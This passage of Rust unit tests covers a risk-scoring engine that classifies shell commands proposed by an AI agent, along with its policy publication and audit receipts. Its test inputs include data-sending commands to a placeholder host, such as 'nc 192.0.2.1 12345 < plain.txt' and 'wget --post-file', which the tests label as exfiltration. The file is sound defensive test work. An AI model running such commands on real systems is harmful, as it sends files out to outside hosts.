            set_tool_risk_runtime_for_test(ToolRiskRuntime::default());
        }
    }

    struct Fixture {
        db: Database,
        _reset: RuntimeReset,
    }

    impl Fixture {
        fn new() -> Self {
            let reset = RuntimeReset;
            set_tool_risk_runtime_for_test(ToolRiskRuntime::default());
            let db = Database::memory().unwrap();
            update_settings(
                &db,
                &ToolRiskSettings {
                    enabled: true,
                    policy_version: 0,
                },
            )
            .unwrap();
            Self { db, _reset: reset }
        }

        fn evaluate(&self, command: &str) -> RiskDecision {
            let runtime = get_tool_risk_runtime();
            assert!(runtime.enabled);
            assert_eq!(
                runtime.policy_version,
                self.db.get_tool_risk_settings().unwrap().policy_version
            );
            let observation = observation(command);
            let before = observation.clone();
            let result = evaluate(&EngineInput {
                observation: &observation,
                rules: &runtime.rules,
                lists: &runtime.command_lists,
            });
            assert_eq!(observation, before);
            result
        }
    }

    fn observation(command: &str) -> ToolObservation {
        ToolObservation {
            schema_version: 1,
            observation_id: "phase2-publication".into(),
            source: ObservationSource::ModelResponse,
            stage: ObservationStage::Proposed,
            execution_scope: ExecutionScope::Client,
            protocol: "anthropic_messages".into(),
            scope_id: "phase2-memory-fixture".into(),
            correlation: Correlation::default(),
            tool: ToolIdentity {
                client: Some("claude".into()),
                name: "Bash".into(),
                namespace: None,
                server_id: None,
                definition_ref: Some("builtin:claude:tools:v1".into()),
            },
            input: ToolInput {
                encoding: InputEncoding::Json,
                value: Some(json!({"command": command})),
                status: InputStatus::Complete,
            },
            quality: ObservationQuality {
                origin: QualityOrigin::Native,
                source_termination: SourceTermination::Normal,
                tool_identity: ToolIdentityQuality::Source,
                input_fidelity: InputFidelity::Preserved,
            },
            context: ObservationContext::default(),
        }
    }

    fn path_condition(op: ConditionOp, value: &str) -> RuleCondition {
        RuleCondition {
            field: "/target_path".into(),
            op,
            value: Some(value.into()),
            values: None,
        }
    }

    fn custom_read_rule(conditions: Vec<RuleCondition>) -> SaveCustomRuleInput {
        SaveCustomRuleInput {
            id: None,
            name: "Phase2 ordinary FileRead target".into(),
            description: None,
            enabled: true,
            selector: RuleSelector {
                sources: Some(vec!["model_response".into()]),
                clients: Some(vec!["claude".into()]),
                target: RuleTarget::Operation {
                    types: vec![OperationType::FileRead],
                },
            },
            conditions,
            risk_category: RiskCategory::SensitiveRead,
            severity: Severity::Medium,
            reason_code: "sensitive_target".into(),
            local_review: LocalReview::Off,
            expected_revision: None,
        }
    }

    fn has_hit(result: &RiskDecision, id: &str, reason: &str) -> bool {
        result
            .hits
            .iter()
            .any(|hit| hit.rule_id == id && hit.reason_code == reason)
    }

    #[test]
    #[serial_test::serial]
    fn legal_custom_read_rule_save_publishes_and_matches_ordinary_reader_targets() {
        let fixture = Fixture::new();
        let before = get_tool_risk_runtime();
        let id = save_custom_rule(
            &fixture.db,
            custom_read_rule(vec![path_condition(
                ConditionOp::Eq,
                "work/risk-demo/plain.txt",
            )]),
        )
        .unwrap()
        .value;
        let published = get_tool_risk_runtime();
        assert_eq!(published.policy_version, before.policy_version + 1);
        assert!(!before.rules.iter().any(|rule| rule.id == id));
        let saved = published.rules.iter().find(|rule| rule.id == id).unwrap();
        assert!(saved.validate().is_ok());
        assert_eq!(saved.revision, 1);
        assert_eq!(saved.risk_category, RiskCategory::SensitiveRead);
        assert_eq!(saved.reason_code, "sensitive_target");
        assert_eq!(
            saved.selector.target,
            RuleTarget::Operation {
                types: vec![OperationType::FileRead]
            }
        );

        for command in [
            "head -n 20 work/risk-demo/plain.txt",
            "tail -20 work/risk-demo/plain.txt",
            "less work/risk-demo/plain.txt",
            "more work/risk-demo/plain.txt",
            "strings -n 8 work/risk-demo/plain.txt",
            "xxd -p work/risk-demo/plain.txt",
            "od -N 32 work/risk-demo/plain.txt",
            "base64 -i work/risk-demo/plain.txt",
            "grep -e token work/risk-demo/plain.txt",
            "awk '{ print $1 }' work/risk-demo/plain.txt",
            "sed -n '1,200p' work/risk-demo/plain.txt",
            "dd if=work/risk-demo/plain.txt",
        ] {
            let result = fixture.evaluate(command);
            assert_eq!(
                result.verdict,
                Some(Verdict::Risky),
                "{command}: {result:?}"
            );
            assert!(
                has_hit(&result, &id, "sensitive_target"),
                "{command}: {result:?}"
            );
            assert!(
                result
                    .operation_categories
                    .contains(&OperationType::FileRead),
                "{command}: {result:?}"
            );
            assert_eq!(
                result.hits.len(),
                1,
                "ordinary target must only match the saved custom rule: {result:?}"
            );
        }
        for command in [
            "head work/risk-demo/other.txt",
            "grep work/risk-demo/plain.txt README.md",
        ] {
            let result = fixture.evaluate(command);
            assert!(
                !has_hit(&result, &id, "sensitive_target"),
                "{command}: {result:?}"
            );
            assert!(result.hits.is_empty(), "{command}: {result:?}");
        }
    }

    #[test]
    #[serial_test::serial]
    fn legal_black_program_save_publishes_basename_matching_without_argument_or_dynamic_hits() {
        let fixture = Fixture::new();
        let before = get_tool_risk_runtime();
        let id = save_command_list(
            &fixture.db,
            SaveCommandListInput {
                id: None,
                expected_revision: None,
                list_type: CommandListType::Blacklist,
                match_kind: CommandMatchKind::Program,
                pattern: "whoami".into(),
                enabled: true,
                severity: Severity::High,
                risk_category: RiskCategory::SensitiveRead,
            },
        )
        .unwrap()
        .value;
        let published = get_tool_risk_runtime();
        assert_eq!(published.policy_version, before.policy_version + 1);
        assert!(before.command_lists.is_empty());
        assert_eq!(published.command_lists.len(), 1);
        assert_eq!(published.command_lists[0].id, id);
        assert_eq!(published.command_lists[0].revision, 1);
        assert!(published.command_lists[0].validate().is_ok());
        for command in ["whoami", "/usr/bin/whoami", "./whoami"] {
            let result = fixture.evaluate(command);
            assert_eq!(
                result.verdict,
                Some(Verdict::Risky),
                "{command}: {result:?}"
            );
            assert!(
                has_hit(&result, &id, "custom_blocklist"),
                "{command}: {result:?}"
            );
        }
        for command in [
            "echo whoami",
            "$PROGRAM whoami",
            "$(whoami)",
            "'/usr/bin/whoami",
        ] {
            let result = fixture.evaluate(command);
            assert!(
                !has_hit(&result, &id, "custom_blocklist"),
                "{command}: {result:?}"
            );
        }
    }

    #[test]
    #[serial_test::serial]
    fn published_read_rule_conditions_cannot_be_joined_across_multiple_reads() {
        let fixture = Fixture::new();
        let id = save_custom_rule(
            &fixture.db,
            custom_read_rule(vec![
                path_condition(ConditionOp::Keyword, "alpha"),
                path_condition(ConditionOp::Keyword, "beta"),
            ]),
        )
        .unwrap()
        .value;
        let separate = fixture.evaluate("head work/risk-demo/alpha.txt work/risk-demo/beta.txt");
        assert!(!has_hit(&separate, &id, "sensitive_target"), "{separate:?}");
        assert!(separate.hits.is_empty(), "{separate:?}");
        assert_eq!(separate.verdict, Some(Verdict::LowRisk), "{separate:?}");
        assert_eq!(
            separate
                .operation_categories
                .iter()
                .filter(|kind| **kind == OperationType::FileRead)
                .count(),
            2
        );

        let combined = fixture.evaluate("head work/risk-demo/alpha-beta.txt");
        assert_eq!(combined.verdict, Some(Verdict::Risky), "{combined:?}");
        assert!(has_hit(&combined, &id, "sensitive_target"), "{combined:?}");
        assert_eq!(combined.hits.len(), 1);
    }
}

#[cfg(test)]
mod phase3_p0_4_publication_tests {
    use super::*;
    use crate::proxy::tool_observation::types::*;
    use crate::services::tool_risk::engine::{evaluate, EngineInput, RiskDecision, Verdict};
    use crate::services::tool_risk::runtime::{
        get_tool_risk_runtime, set_tool_risk_runtime_for_test,
    };
    use serde_json::json;

    struct RuntimeReset;

    impl Drop for RuntimeReset {
        fn drop(&mut self) {
            set_tool_risk_runtime_for_test(ToolRiskRuntime::default());
        }
    }

    struct Fixture {
        db: Database,
        _reset: RuntimeReset,
    }

    impl Fixture {
        fn new() -> Self {
            let reset = RuntimeReset;
            set_tool_risk_runtime_for_test(ToolRiskRuntime::default());
            let db = Database::memory().unwrap();
            let before = db.get_tool_risk_settings().unwrap().policy_version;
            update_settings(
                &db,
                &ToolRiskSettings {
                    enabled: true,
                    policy_version: u64::MAX,
                },
            )
            .unwrap();
            let runtime = get_tool_risk_runtime();
            assert!(runtime.enabled);
            assert_eq!(runtime.policy_version, before + 1);
            assert_eq!(
                runtime.policy_version,
                db.get_tool_risk_settings().unwrap().policy_version
            );
            Self { db, _reset: reset }
        }

        fn evaluate(&self, observation: &ToolObservation) -> RiskDecision {
            let runtime = get_tool_risk_runtime();
            assert!(runtime.enabled);
            assert_eq!(
                runtime.policy_version,
                self.db.get_tool_risk_settings().unwrap().policy_version
            );
            let before = observation.clone();
            let result = evaluate(&EngineInput {
                observation,
                rules: &runtime.rules,
                lists: &runtime.command_lists,
            });
            assert_eq!(
                observation, &before,
                "publication/evaluation must preserve the observation"
            );
            result
        }

        fn save(&self, conditions: Vec<RuleCondition>) -> String {
            let before = get_tool_risk_runtime();
            let id = save_custom_rule(&self.db, custom_send_rule(conditions))
                .unwrap()
                .value;
            let published = get_tool_risk_runtime();
            assert!(published.enabled);
            assert_eq!(published.policy_version, before.policy_version + 1);
            assert_eq!(
                published.policy_version,
                self.db.get_tool_risk_settings().unwrap().policy_version
            );
            assert!(
                !before.rules.iter().any(|rule| rule.id == id),
                "old Arc snapshot must remain unchanged"
            );
            let saved = published.rules.iter().find(|rule| rule.id == id).unwrap();
            assert_eq!(saved.revision, 1);
            assert_eq!(saved.origin, RuleOrigin::Custom);
            assert_eq!(
                saved.selector.target,
                RuleTarget::Operation {
                    types: vec![OperationType::DataSend]
                }
            );
            assert_eq!(saved.risk_category, RiskCategory::DataExfiltration);
            assert_eq!(saved.reason_code, "exfil_to_remote");
            assert!(saved.validate().is_ok());
            assert!(saved.validate_custom_policy().is_ok());
            assert_eq!(get_rule(&self.db, &id).unwrap().as_ref(), Some(saved));
            id
        }
    }

    // Only proposed in-memory strings are evaluated, never executed or read as files.
    fn observation(command: &str) -> ToolObservation {
        ToolObservation {
            schema_version: 1,
            observation_id: "phase3-p0-4-publication".into(),
            source: ObservationSource::ModelResponse,
            stage: ObservationStage::Proposed,
            execution_scope: ExecutionScope::Client,
            protocol: "anthropic_messages".into(),
            scope_id: "phase3-p0-4-memory-fixture".into(),
            correlation: Correlation::default(),
            tool: ToolIdentity {
                client: Some("claude".into()),
                name: "Bash".into(),
                namespace: None,
                server_id: None,
                definition_ref: Some("builtin:claude:tools:v1".into()),
            },
            input: ToolInput {
                encoding: InputEncoding::Json,
                value: Some(json!({"command": command})),
                status: InputStatus::Complete,
            },
            quality: ObservationQuality {
                origin: QualityOrigin::Native,
                source_termination: SourceTermination::Normal,
                tool_identity: ToolIdentityQuality::Source,
                input_fidelity: InputFidelity::Preserved,
            },
            context: ObservationContext::default(),
        }
    }

    fn condition(field: &str, value: &str) -> RuleCondition {
        RuleCondition {
            field: field.into(),
            op: ConditionOp::Eq,
            value: Some(value.into()),
            values: None,
        }
    }

    fn custom_send_rule(conditions: Vec<RuleCondition>) -> SaveCustomRuleInput {
        SaveCustomRuleInput {
            id: None,
            name: "Phase3 ordinary DataSend source/destination".into(),
            description: None,
            enabled: true,
            selector: RuleSelector {
                sources: Some(vec!["model_response".into()]),
                clients: Some(vec!["claude".into()]),
                target: RuleTarget::Operation {
                    types: vec![OperationType::DataSend],
                },
            },
            conditions,
            risk_category: RiskCategory::DataExfiltration,
            severity: Severity::Medium,
            reason_code: "exfil_to_remote".into(),
            local_review: LocalReview::Off,
            expected_revision: None,
        }
    }

    fn assert_custom_hit(result: &RiskDecision, id: &str) {
        assert_eq!(result.verdict, Some(Verdict::Risky), "{result:?}");
        assert!(
            result
                .operation_categories
                .contains(&OperationType::DataSend),
            "{result:?}"
        );
        assert_eq!(
            result.hits.len(),
            1,
            "ordinary sources must only hit the saved custom rule: {result:?}"
        );
        assert_eq!(result.hits[0].rule_id, id);
        assert_eq!(result.hits[0].revision, 1);
        assert_eq!(result.hits[0].reason_code, "exfil_to_remote");
    }

    #[test]
    #[serial_test::serial]
    fn legal_source_rule_hot_publication_matches_all_ordinary_file_transfers() {
        let fixture = Fixture::new();
        let observations: Vec<_> = [
            "scp plain.txt user@192.0.2.1:/tmp/x",
            "rsync -a plain.txt user@192.0.2.1:/tmp/",
            "wget --post-file=plain.txt https://192.0.2.1/",
            "nc 192.0.2.1 12345 < plain.txt",
        ]
        .into_iter()
        .map(observation)
        .collect();
        let originals = observations.clone();
        for obs in &observations {
            assert!(
                fixture.evaluate(obs).hits.is_empty(),
                "ordinary source has no builtin hit"
            );
        }
        let id = fixture.save(vec![condition("/target_path", "plain.txt")]);
        for obs in &observations {
            assert_custom_hit(&fixture.evaluate(obs), &id);
        }
        assert_eq!(
            observations, originals,
            "same observations survive the hot publication unchanged"
        );
        for command in [
            "scp other.txt user@192.0.2.1:/tmp/x",
            "rsync -a other.txt user@192.0.2.1:/tmp/",
            "wget --post-file=other.txt https://192.0.2.1/",
            "nc 192.0.2.1 12345 < other.txt",
        ] {
            assert!(
                fixture.evaluate(&observation(command)).hits.is_empty(),
                "{command}"
            );
        }
    }

    #[test]
    #[serial_test::serial]
    fn legal_destination_rules_hot_publish_ssh_https_and_tcp_facts_without_builtin_exfil() {
        let fixture = Fixture::new();
        for (destination, commands) in [
            (
                "ssh://192.0.2.1/",
                vec![
                    "scp plain.txt user@192.0.2.1:/tmp/x",
                    "rsync -a plain.txt user@192.0.2.1:/tmp/",
                ],
            ),
            (
                "https://192.0.2.1/",
                vec!["wget --post-file=plain.txt https://192.0.2.1/"],
            ),
            (
                "tcp://192.0.2.1:12345/",
                vec!["nc 192.0.2.1 12345 < plain.txt"],
            ),
        ] {
            let observations: Vec<_> = commands.into_iter().map(observation).collect();
            let originals = observations.clone();
            for obs in &observations {
                assert!(fixture.evaluate(obs).hits.is_empty());
            }
            let id = fixture.save(vec![condition("/destination", destination)]);
            for obs in &observations {
                assert_custom_hit(&fixture.evaluate(obs), &id);
            }
            assert_eq!(observations, originals);
        }
        for command in [
            "scp plain.txt user@192.0.2.2:/tmp/x",
            "rsync -a plain.txt user@192.0.2.2:/tmp/",
            "wget --post-file=plain.txt https://192.0.2.2/",
            "nc 192.0.2.2 12345 < plain.txt",
        ] {
            assert!(
                fixture.evaluate(&observation(command)).hits.is_empty(),
                "{command}"
            );
        }
    }

    #[test]
    #[serial_test::serial]
    fn published_source_destination_conditions_cannot_join_different_data_send_operations() {
        let fixture = Fixture::new();
        let id = fixture.save(vec![
            condition("/target_path", "plain.txt"),
            condition("/destination", "ssh://192.0.2.1/"),
        ]);
        for command in [
            "scp plain.txt user@192.0.2.2:/tmp/x; scp other.txt user@192.0.2.1:/tmp/x",
            "rsync -a plain.txt user@192.0.2.2:/tmp/; rsync -a other.txt user@192.0.2.1:/tmp/",
        ] {
            let obs = observation(command);
            let result = fixture.evaluate(&obs);
            assert!(
                result.hits.is_empty(),
                "source/destination cannot be joined across operations: {command}: {result:?}"
            );
            assert_eq!(
                result
                    .operation_categories
                    .iter()
                    .filter(|kind| **kind == OperationType::DataSend)
                    .count(),
                2,
                "{command}: {result:?}"
            );
            assert_ne!(
                result.verdict,
                Some(Verdict::LowRisk),
                "{command}: {result:?}"
            );
        }
        for command in [
            "scp plain.txt user@192.0.2.1:/tmp/x",
            "rsync -a plain.txt user@192.0.2.1:/tmp/",
        ] {
            assert_custom_hit(&fixture.evaluate(&observation(command)), &id);
        }
    }
}

#[cfg(test)]
mod policy_receipt_tests {
    use super::*;
    use crate::error::AppError;
    use crate::services::tool_risk::runtime::{collection_enabled, get_tool_risk_runtime};
    use serde_json::{json, Value};

    fn rule_input() -> SaveCustomRuleInput {
        let rule = super::super::builtin::builtin_rules().remove(0);
        SaveCustomRuleInput {
            id: None,
            expected_revision: None,
            name: "SECRET_RULE_NAME".into(),
            description: Some("SECRET_DESCRIPTION".into()),
            enabled: true,
            selector: RuleSelector {
                clients: Some(vec!["claude".into()]),
                ..rule.selector
            },
            conditions: rule.conditions,
            risk_category: rule.risk_category,
            severity: rule.severity,
            reason_code: rule.reason_code,
            local_review: LocalReview::Off,
        }
    }

    fn list_input() -> SaveCommandListInput {
        SaveCommandListInput {
            id: None,
            expected_revision: None,
            list_type: CommandListType::Blacklist,
            match_kind: CommandMatchKind::Keyword,
            pattern: "SECRET_PATTERN".into(),
            enabled: true,
            severity: Severity::High,
            risk_category: RiskCategory::DataExfiltration,
        }
    }

    fn assert_receipt<T: Serialize>(
        receipt: T,
        value: Value,
        version: u64,
        audit: &str,
        runtime: &str,
    ) {
        assert_eq!(
            serde_json::to_value(receipt).unwrap(),
            json!({
                "value": value, "persistedPolicyVersion": version,
                "auditStatus": audit, "runtimeStatus": runtime,
            })
        );
    }

    fn receipt_id<T: Serialize>(receipt: T) -> String {
        let wire = serde_json::to_value(receipt).unwrap();
        wire["value"]
            .as_str()
            .expect("save receipt must carry generated ID in value")
            .to_owned()
    }

    #[test]
    #[serial_test::serial]
    fn seven_writes_return_committed_versions_and_local_ui_audit_in_same_transaction() {
        let db = Database::memory().unwrap();
        db.conn.lock().unwrap().execute_batch("CREATE TRIGGER check_receipt_actor BEFORE INSERT ON tool_risk_policy_changes
            WHEN NEW.actor != 'local_ui' OR NEW.policy_version != CAST((SELECT value FROM tool_risk_settings WHERE key = 'policy_version') AS INTEGER)
            BEGIN SELECT RAISE(ABORT, 'SECRET_WRONG_TRANSACTION'); END;").unwrap();
        assert_receipt(
            update_settings(
                &db,
                &ToolRiskSettings {
                    enabled: true,
                    policy_version: u64::MAX,
                },
            )
            .unwrap(),
            json!(null),
            1,
            "recorded",
            "applied",
        );
        let id = receipt_id(save_custom_rule(&db, rule_input()).unwrap());
        let mut edit = rule_input();
        edit.id = Some(id.clone());
        edit.expected_revision = Some(1);
        edit.name = "SECRET_EDITED".into();
        assert_receipt(
            save_custom_rule(&db, edit).unwrap(),
            json!(id),
            3,
            "recorded",
            "applied",
        );
        assert_receipt(
            toggle_rule(&db, &id, false, 2).unwrap(),
            json!(null),
            4,
            "recorded",
            "applied",
        );
        assert_receipt(
            delete_custom_rule(&db, &id, 3).unwrap(),
            json!(true),
            5,
            "recorded",
            "applied",
        );
        assert_receipt(
            toggle_rule(&db, "builtin.sensitive_read", false, 1).unwrap(),
            json!(null),
            6,
            "recorded",
            "applied",
        );
        assert_receipt(
            reset_builtin_rule(&db, "builtin.sensitive_read", 2).unwrap(),
            json!(null),
            7,
            "recorded",
            "applied",
        );
        let list_id = receipt_id(save_command_list(&db, list_input()).unwrap());
        let mut edit = list_input();
        edit.id = Some(list_id.clone());
        edit.expected_revision = Some(1);
        edit.enabled = false;
        assert_receipt(
            save_command_list(&db, edit).unwrap(),
            json!(list_id),
            9,
            "recorded",
            "applied",
        );
        assert_receipt(
            delete_command_list(&db, &list_id, 2).unwrap(),
            json!(true),
            10,
            "recorded",
            "applied",
        );
        let conn = db.conn.lock().unwrap();
        let rows: (i64, i64, i64) = conn.query_row("SELECT COUNT(*), MIN(policy_version), MAX(policy_version) FROM tool_risk_policy_changes WHERE actor = 'local_ui'", [], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?))).unwrap();
        assert_eq!(rows, (10, 1, 10));
        let audit: String = conn
            .query_row(
                "SELECT GROUP_CONCAT(changed_fields) FROM tool_risk_policy_changes",
                [],
                |row| row.get(0),
            )
            .unwrap();
        assert!(!audit.contains("SECRET_"));
        assert_eq!(get_tool_risk_runtime().policy_version, 10);
    }

    #[test]
    #[serial_test::serial]
    fn unchanged_settings_returns_not_needed_without_fabricated_history() {
        let db = Database::memory().unwrap();
        assert_receipt(
            update_settings(&db, &ToolRiskSettings::default()).unwrap(),
            json!(null),
            1,
            "not_needed",
            "applied",
        );
        let count: i64 = db
            .conn
            .lock()
            .unwrap()
            .query_row("SELECT COUNT(*) FROM tool_risk_policy_changes", [], |row| {
                row.get(0)
            })
            .unwrap();
        assert_eq!(count, 0);
    }

    #[test]
    #[serial_test::serial]
    fn audit_failure_still_publishes_once_without_resaving() {
        let db = Database::memory().unwrap();
        db.conn.lock().unwrap().execute_batch("CREATE TRIGGER fail_policy_audit BEFORE INSERT ON tool_risk_policy_changes BEGIN SELECT RAISE(ABORT, 'SECRET_AUDIT_FAILURE'); END;").unwrap();
        assert_receipt(
            update_settings(
                &db,
                &ToolRiskSettings {
                    enabled: true,
                    policy_version: 999,
                },
            )
            .unwrap(),
            json!(null),
            1,
            "audit_unavailable",
            "applied",
        );
        assert!(collection_enabled());
        assert_eq!(get_tool_risk_runtime().policy_version, 1);
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 1);
        let count: i64 = db
            .conn
            .lock()
            .unwrap()
            .query_row("SELECT COUNT(*) FROM tool_risk_policy_changes", [], |row| {
                row.get(0)
            })
            .unwrap();
        assert_eq!(count, 0);
    }

    #[test]
    #[serial_test::serial]
    fn reload_read_failure_closes_collection_but_preserves_saved_receipt() {
        let db = Database::memory().unwrap();
        update_settings(
            &db,
            &ToolRiskSettings {
                enabled: true,
                policy_version: 0,
            },
        )
        .unwrap();
        assert!(collection_enabled());
        db.conn
            .lock()
            .unwrap()
            .execute_batch("DROP TABLE tool_risk_command_lists;")
            .unwrap();
        assert_receipt(
            update_settings(
                &db,
                &ToolRiskSettings {
                    enabled: false,
                    policy_version: 0,
                },
            )
            .expect("committed write must not become an Err"),
            json!(null),
            2,
            "recorded",
            "apply_failed",
        );
        assert!(!collection_enabled());
        assert!(!get_tool_risk_runtime().enabled);
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 2);
        assert_eq!(
            reload_runtime(&db).unwrap_err(),
            "工具风险配置读取失败，采集已关闭"
        );
    }

    #[test]
    #[serial_test::serial]
    fn configuration_failure_has_fixed_error_and_no_success_history_or_publish() {
        let db = Database::memory().unwrap();
        db.conn.lock().unwrap().execute_batch("CREATE TRIGGER fail_policy_config BEFORE INSERT ON tool_risk_settings WHEN NEW.key = 'enabled' BEGIN SELECT RAISE(ABORT, 'SECRET_CONFIGURATION_FAILURE'); END;").unwrap();
        let error = update_settings(
            &db,
            &ToolRiskSettings {
                enabled: true,
                policy_version: 0,
            },
        )
        .unwrap_err();
        assert_eq!(error, "工具风险配置保存失败，请刷新后重试");
        let conn = db.conn.lock().unwrap();
        let count: i64 = conn
            .query_row("SELECT COUNT(*) FROM tool_risk_policy_changes", [], |row| {
                row.get(0)
            })
            .unwrap();
        assert_eq!(count, 0);
        drop(conn);
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 0);
    }

    #[test]
    #[serial_test::serial]
    fn failed_publisher_receipt_never_echoes_secret_or_claims_application() {
        let db = Database::memory().unwrap();
        let mut calls = 0;
        let receipt = mutate_with_publisher(
            &db,
            || {
                db.save_tool_risk_settings_with_actor(
                    &ToolRiskSettings {
                        enabled: true,
                        policy_version: 100,
                    },
                    ToolRiskActor::LocalUi,
                )
            },
            |snapshot| {
                assert!(
                    db.conn.try_lock().is_ok(),
                    "DAO lock must be released before publishing"
                );
                assert!(snapshot.enabled);
                assert_eq!(snapshot.policy_version, 1);
                calls += 1;
                false
            },
        )
        .expect("publisher failure must retain committed receipt");
        assert_receipt(receipt, json!(null), 1, "recorded", "apply_failed");
        assert_eq!(calls, 1);
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 1);
    }

    #[test]
    #[serial_test::serial]
    fn injected_configuration_error_does_not_echo_or_invoke_publisher() {
        let db = Database::memory().unwrap();
        let mut calls = 0;
        let error = mutate_with_publisher::<()>(
            &db,
            || Err(AppError::Database("SECRET_INTERNAL_FAILURE".into())),
            |_| {
                calls += 1;
                true
            },
        )
        .unwrap_err();
        assert_eq!(error, "工具风险配置保存失败，请刷新后重试");
        assert_eq!(calls, 0);
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 0);
    }
}

#[cfg(test)]
mod receipt_boundary_tests {
    use super::*;
    use crate::services::tool_risk::builtin::builtin_rules;
    use crate::services::tool_risk::runtime::get_tool_risk_runtime;
    use serde_json::json;

    #[test]
    #[serial_test::serial]
    fn publisher_failure_receipt_omits_secrets_from_actual_configuration_snapshot() {
        let db = Database::memory().unwrap();
        let mut rule = builtin_rules().remove(0);
        rule.id = format!("custom-{}", uuid::Uuid::new_v4());
        rule.origin = RuleOrigin::Custom;
        rule.name = "SECRET_PUBLISH_RULE_NAME".into();
        rule.description = Some("SECRET_PUBLISH_RULE_DESCRIPTION".into());
        rule.selector.clients = Some(vec!["claude".into()]);
        db.save_custom_tool_risk_rule(&rule, None).unwrap();
        let list = CommandListEntry {
            id: format!("shell-list-{}", uuid::Uuid::new_v4()),
            revision: 1,
            list_type: CommandListType::Blacklist,
            match_kind: CommandMatchKind::Keyword,
            pattern: "SECRET_PUBLISH_PATTERN".into(),
            enabled: true,
            severity: Severity::High,
            risk_category: RiskCategory::DataExfiltration,
        };
        db.save_tool_risk_command_list(&list, None).unwrap();
        let mut published = Vec::new();
        let receipt = mutate_with_publisher(
            &db,
            || {
                db.save_tool_risk_settings_with_actor(
                    &ToolRiskSettings {
                        enabled: true,
                        policy_version: 999,
                    },
                    ToolRiskActor::LocalUi,
                )
            },
            |snapshot| {
                published.push((snapshot, db.conn.try_lock().is_ok()));
                false
            },
        )
        .unwrap();
        assert_eq!(published.len(), 1);
        assert!(
            published[0].1,
            "publisher must not hold DAO connection lock"
        );
        let snapshot = &published[0].0;
        assert!(snapshot.enabled);
        assert_eq!(snapshot.policy_version, 3);
        assert!(snapshot
            .rules
            .iter()
            .any(|rule| rule.name == "SECRET_PUBLISH_RULE_NAME"));
        assert!(snapshot
            .command_lists
            .iter()
            .any(|list| list.pattern == "SECRET_PUBLISH_PATTERN"));
        let wire = serde_json::to_value(receipt).unwrap();
        assert_eq!(
            wire,
            json!({"value": null, "persistedPolicyVersion": 3, "auditStatus": "recorded", "runtimeStatus": "apply_failed"})
        );
        assert!(!wire.to_string().contains("SECRET_"));
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 3);
    }

    #[test]
    #[serial_test::serial]
    fn revision_conflicts_do_not_append_history_or_republish_a_snapshot() {
        let db = Database::memory().unwrap();
        toggle_rule(&db, "builtin.sensitive_read", false, 1).unwrap();
        let before = get_tool_risk_runtime();
        let count = || {
            db.conn
                .lock()
                .unwrap()
                .query_row::<i64, _, _>(
                    "SELECT COUNT(*) FROM tool_risk_policy_changes",
                    [],
                    |row| row.get(0),
                )
                .unwrap()
        };
        let history_len = count();
        for error in [
            toggle_rule(&db, "builtin.sensitive_read", true, 1).unwrap_err(),
            reset_builtin_rule(&db, "builtin.sensitive_read", 1).unwrap_err(),
        ] {
            assert_eq!(error, "工具风险配置保存失败，请刷新后重试");
        }
        assert_eq!(count(), history_len);
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 1);
        assert!(std::sync::Arc::ptr_eq(&before, &get_tool_risk_runtime()));
    }
}

#[cfg(test)]
mod validation_code_tests {
    use super::*;
    use crate::services::tool_risk::builtin::builtin_rules;

    fn input() -> SaveCustomRuleInput {
        let rule = builtin_rules().remove(0);
        SaveCustomRuleInput {
            id: None,
            expected_revision: None,
            name: "SECRET_INVALID_RULE".into(),
            description: None,
            enabled: true,
            selector: rule.selector,
            conditions: rule.conditions,
            risk_category: rule.risk_category,
            severity: rule.severity,
            reason_code: rule.reason_code,
            local_review: LocalReview::Off,
        }
    }

    #[test]
    #[serial_test::serial]
    fn real_saves_preserve_exact_fixed_policy_validation_codes() {
        let db = Database::memory().unwrap();
        assert_eq!(
            save_custom_rule(&db, input()).unwrap_err(),
            "tool_risk_builtin_duplicate"
        );
        let mut no_severity = input();
        no_severity.selector.clients = Some(vec!["claude".into()]);
        no_severity.severity = Severity::None;
        assert_eq!(
            save_custom_rule(&db, no_severity).unwrap_err(),
            "tool_risk_risk_severity_required"
        );
        assert!(db.get_custom_tool_risk_rules().unwrap().is_empty());
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 0);
        assert!(db.get_tool_risk_policy_changes(10, 0).unwrap().is_empty());
    }

    #[test]
    #[serial_test::serial]
    fn validation_code_prefix_cannot_allow_database_secret_echoing() {
        let db = Database::memory().unwrap();
        for code in [
            "tool_risk_builtin_duplicate",
            "tool_risk_risk_severity_required",
            "tool_risk_command_list_duplicate",
            "tool_risk_command_list_conflict",
            "tool_risk_command_list_limit",
        ] {
            // Real SQLite failure: only the entire fixed code is allowed through.
            db.conn.lock().unwrap().execute_batch(&format!("DROP TRIGGER IF EXISTS fail_validation_prefix; CREATE TRIGGER fail_validation_prefix BEFORE INSERT ON tool_risk_custom_rules BEGIN SELECT RAISE(ABORT, '{code}: SECRET_DATABASE_TEXT'); END;")).unwrap();
            let mut valid = input();
            valid.selector.clients = Some(vec!["claude".into()]);
            assert_eq!(
                save_custom_rule(&db, valid).unwrap_err(),
                "工具风险配置保存失败，请刷新后重试"
            );
        }
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 0);
        assert!(db.get_tool_risk_policy_changes(10, 0).unwrap().is_empty());
    }
}
